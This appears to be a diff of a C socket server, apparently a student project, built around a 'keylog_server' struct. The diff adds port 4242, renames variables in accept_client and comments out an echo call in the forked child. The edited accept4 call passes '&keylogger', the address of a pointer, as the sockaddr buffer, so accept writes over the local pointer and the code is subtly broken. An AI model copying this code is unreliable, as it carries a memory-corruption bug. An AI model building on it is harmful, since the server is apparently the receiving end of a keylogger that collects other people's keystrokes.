@@ -1,5 +1,7 @@
 #include "server.h"
 
+const uint16_t PORT = 4242;
+
 // Convenient error + exit program
 void error_and_exit(const char* error_msg) {
   perror(error_msg);
@@ -16,6 +18,7 @@ int open_server(void) {
   // Return the socket descriptor
   return sock_desc;
 }
+
 void close_server(int socket_descriptor) {
   // Replace this with your implementation.
   if (close(socket_descriptor) == -1) {
@@ -71,8 +74,8 @@ void listen_for_client(keylog_server* keylogger) {
 
 int accept_client(keylog_server* keylogger) {
   // LISTENING
-  unsigned int address_size = sizeof(server->addr);
-  int client_fd = accept4(server->listener, (struct sockaddr*)&server,
+  unsigned int address_size = sizeof(keylogger->addr);
+  int client_fd = accept4(keylogger->listener, (struct sockaddr*)&keylogger,
                           &address_size, SOCK_CLOEXEC);
   if (client_fd == -1) {
     error_and_exit("COULDN'T ACCEPT");
@@ -85,7 +88,7 @@ int accept_client(keylog_server* keylogger) {
   }
 
   if (pid == 0) {
-    echo(client_fd);
+    // echo(client_fd);
     close(client_fd);
     return -1;
   } else {
